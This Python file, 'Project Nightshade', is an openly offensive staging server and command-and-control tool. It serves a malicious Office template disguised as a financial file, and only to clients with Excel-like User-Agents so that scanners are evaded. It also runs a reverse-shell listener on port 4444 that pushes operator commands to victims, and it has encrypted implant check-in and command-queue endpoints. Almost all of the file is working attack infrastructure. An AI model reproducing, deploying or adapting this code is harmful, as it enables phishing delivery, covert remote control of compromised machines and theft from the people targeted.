#!/usr/bin/env python3
"""
Project Nightshade - Enhanced Staging Server + C2
Author: ek0ms savi0r | OPSEC Grade: Midnight
Description:
    Combined staging server and basic C2 that can:
    - Serve malicious templates
    - Act as reverse shell handler
    - Provide basic RCE command interface
"""
from flask import Flask, request, send_file, abort, jsonify, make_response
import logging
import datetime
import sqlite3
import random
import time
import threading
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import os
import json
import subprocess
import socket
import requests
from threading import Thread

# Configuration
class StagingConfig:
    PORT = 8080
    HOST = '0.0.0.0'
    DATABASE = 'staging_logs.db'
    TEMPLATE_FILE = 'nightshade_template.ole'
    
    # C2 Configuration
    C2_ENABLED = True
    REVERSE_SHELL_PORT = 4444
    COMMAND_INTERVAL = 60
    
    # Ngrok configuration
    USE_NGROK = True
    NGROK_AUTH_TOKEN = ''
    NGROK_REGION = 'us'
    
    # Valid Excel User-Agents
    EXCEL_USER_AGENTS = [
        'Microsoft Office Excel 2016',
        'Microsoft Excel 2019',
        'Microsoft Excel 365',
        'Microsoft Office/16.0 (Windows NT 10.0; Microsoft Excel 16.0)',
    ]
    
    ENCRYPTION_KEY = 'nightshade-midnight-love-2023'

app = Flask(__name__)
config = StagingConfig()

# Global variables for C2
active_sessions = {}
command_queue = {}

def init_database():
    """Initialize SQLite database for logging"""
    conn = sqlite3.connect(config.DATABASE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS requests
                 (id INTEGER PRIMARY KEY, timestamp TEXT, ip TEXT, 
                  user_agent TEXT, endpoint TEXT, status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS sessions
                 (id INTEGER PRIMARY KEY, session_id TEXT, ip TEXT, 
                  first_seen TEXT, last_seen TEXT, status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY, session_id TEXT, command TEXT, 
                  timestamp TEXT, result TEXT)''')
    conn.commit()
    conn.close()

def log_request(ip, user_agent, endpoint, status="DELIVERED"):
    """Log requests to database"""
    conn = sqlite3.connect(config.DATABASE)
    c = conn.cursor()
    timestamp = datetime.datetime.now().isoformat()
    c.execute("INSERT INTO requests (timestamp, ip, user_agent, endpoint, status) VALUES (?, ?, ?, ?, ?)",
              (timestamp, ip, user_agent, endpoint, status))
    conn.commit()
    conn.close()

def log_session(session_id, ip, status="ACTIVE"):
    """Log C2 sessions"""
    conn = sqlite3.connect(config.DATABASE)
    c = conn.cursor()
    timestamp = datetime.datetime.now().isoformat()
    
    # Check if session exists
    c.execute("SELECT id FROM sessions WHERE session_id = ?", (session_id,))
    existing = c.fetchone()
    
    if existing:
        c.execute("UPDATE sessions SET last_seen = ?, status = ? WHERE session_id = ?",
                 (timestamp, status, session_id))
    else:
        c.execute("INSERT INTO sessions (session_id, ip, first_seen, last_seen, status) VALUES (?, ?, ?, ?, ?)",
                 (session_id, ip, timestamp, timestamp, status))
    conn.commit()
    conn.close()

def log_command(session_id, command, result):
    """Log executed commands"""
    conn = sqlite3.connect(config.DATABASE)
    c = conn.cursor()
    timestamp = datetime.datetime.now().isoformat()
    c.execute("INSERT INTO commands (session_id, command, timestamp, result) VALUES (?, ?, ?, ?)",
              (session_id, command, timestamp, result))
    conn.commit()
    conn.close()

def is_excel_request(user_agent):
    """Check if request comes from genuine Excel"""
    if not user_agent:
        return False
    
    user_agent = user_agent.lower()
    excel_indicators = ['excel', 'microsoft', 'office']
    
    return any(indicator in user_agent for indicator in excel_indicators)

def encrypt_data(data, key):
    """Encrypt data with AES"""
    cipher = AES.new(pad(key.encode(), AES.block_size), AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    return base64.b64encode(cipher.iv + ct_bytes).decode()

def decrypt_data(encrypted_data, key):
    """Decrypt AES encrypted data"""
    encrypted_data = base64.b64decode(encrypted_data)
    iv = encrypted_data[:16]
    ct = encrypted_data[16:]
    cipher = AES.new(pad(key.encode(), AES.block_size), AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode()

def reverse_shell_handler():
    """Handle incoming reverse shell connections"""
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', config.REVERSE_SHELL_PORT))
        server.listen(5)
        
        print(f"[+] Reverse shell handler started on port {config.REVERSE_SHELL_PORT}")
        
        while True:
            client_socket, addr = server.accept()
            print(f"[+] Reverse shell connection from {addr[0]}:{addr[1]}")
            
            # Handle the shell in a new thread
            def handle_client(client, address):
                try:
                    client.send(b"Connected to Nightshade C2\nPS > ")
                    
                    while True:
                        command = input(f"nightshade@{address[0]} $ ").strip()
                        if not command:
                            continue
                            
                        if command.lower() == 'exit':
                            break
                            
                        client.send(command.encode() + b"\n")
                        
                        # Receive output
                        output = b""
                        while True:
                            try:
                                data = client.recv(1024)
                                if not data:
                                    break
                                output += data
                                if b"PS >" in output:
                                    break
                            except:
                                break
                        
                        print(output.decode())
                        
                except Exception as e:
                    print(f"[-] Shell error: {e}")
                finally:
                    client.close()
            
            Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()
            
    except Exception as e:
        print(f"[-] Reverse shell handler error: {e}")

@app.route('/template.ole')
def serve_template():
    """Serve the malicious template"""
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    
    if not is_excel_request(user_agent):
        log_request(client_ip, user_agent, '/template.ole', 'BLOCKED')
        abort(404)
    
    log_request(client_ip, user_agent, '/template.ole')
    
    try:
        return send_file(config.TEMPLATE_FILE, 
                        as_attachment=True,
                        download_name='financial_template.ole')
    except FileNotFoundError:
        abort(404)

@app.route('/c2/checkin', methods=['POST'])
def c2_checkin():
    """C2 check-in endpoint for RCE payloads"""
    try:
        session_id = request.headers.get('X-Session-ID')
        if not session_id:
            return jsonify({'status': 'error', 'message': 'No session ID'})
        
        client_ip = request.remote_addr
        encrypted_data = request.get_data().decode()
        
        # Decrypt the check-in
        decrypted_data = decrypt_data(encrypted_data, config.ENCRYPTION_KEY)
        
        log_session(session_id, client_ip)
        
        # Check if we have commands for this session
        if session_id in command_queue and command_queue[session_id]:
            command = command_queue[session_id].pop(0)
            encrypted_command = encrypt_data(command, config.ENCRYPTION_KEY)
            return encrypted_command
        else:
            return encrypt_data("noop", config.ENCRYPTION_KEY)
            
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/c2/result', methods=['POST'])
def c2_result():
    """Receive command results from implants"""
    try:
        session_id = request.headers.get('X-Session-ID')
        encrypted_result = request.get_data().decode()
        
        result = decrypt_data(encrypted_result, config.ENCRYPTION_KEY)
        log_command(session_id, "EXECUTED", result[:500])  # Limit log size
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/c2/command', methods=['POST'])
def submit_command():
    """Submit command to specific session"""
    try:
        session_id = request.json.get('session_id')
        command = request.json.get('command')
        
        if session_id not in command_queue:
            command_queue[session_id] = []
        
        command_queue[session_id].append(command)
        return jsonify({'status': 'success'})
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/c2/sessions')
def list_sessions():
    """List active C2 sessions"""
    conn = sqlite3.connect(config.DATABASE)
    c = conn.cursor()
    c.execute("SELECT session_id, ip, first_seen, last_seen, status FROM sessions ORDER BY last_seen DESC")
    sessions = c.fetchall()
    conn.close()
    
    return jsonify({'sessions': sessions})

@app.route('/admin/stats')
def admin_stats():
    """Admin statistics endpoint"""
    conn = sqlite3.connect(config.DATABASE)
    c = conn.cursor()
    
    c.execute("SELECT COUNT(*) FROM requests")
    total_requests = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM sessions")
    total_sessions = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM commands")
    total_commands = c.fetchone()[0]
    
    conn.close()
    
    return jsonify({
        'total_requests': total_requests,
        'total_sessions': total_sessions,
        'total_commands': total_commands,
        'active_sessions': len(command_queue)
    })

def generate_malicious_template():
    """Generate the malicious template file"""
    template_content = '''<?xml version="1.0" encoding="UTF-8"?>
<Objects xmlns="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <Object ProgID="Excel.Macro.1" Version="1.0">
        <Payload>EMBEDDED_PAYLOAD</Payload>
        <ActivationCondition>TRUE</ActivationCondition>
    </Object>
</Objects>'''
    
    with open(config.TEMPLATE_FILE, 'w') as f:
        f.write(template_content)

if __name__ == '__main__':
    init_database()
    generate_malicious_template()
    
    print('''
    ╔══════════════════════════════════════════════════════════╗
    ║               NIGHTSHADE STAGING SERVER                  ║
    ║               + C2 COMMAND & CONTROL                     ║
    ║                   by : ek0ms savi0r                      ║
    ╚══════════════════════════════════════════════════════════╝
    ''')
    
    # Start reverse shell handler if enabled
    if config.C2_ENABLED:
        shell_thread = Thread(target=reverse_shell_handler, daemon=True)
        shell_thread.start()
        print(f"[+] Reverse shell handler started on port {config.REVERSE_SHELL_PORT}")
    
    print(f"[+] Staging server starting on {config.HOST}:{config.PORT}")
    print("[+] Endpoints:")
    print("    - GET  /template.ole    (Serve malicious template)")
    print("    - POST /c2/checkin      (Agent check-in)")
    print("    - POST /c2/result       (Command results)")
    print("    - POST /c2/command      (Submit commands)")
    print("    - GET  /c2/sessions     (List active sessions)")
    
    app.run(host=config.HOST, port=config.PORT, debug=False, use_reloader=False)
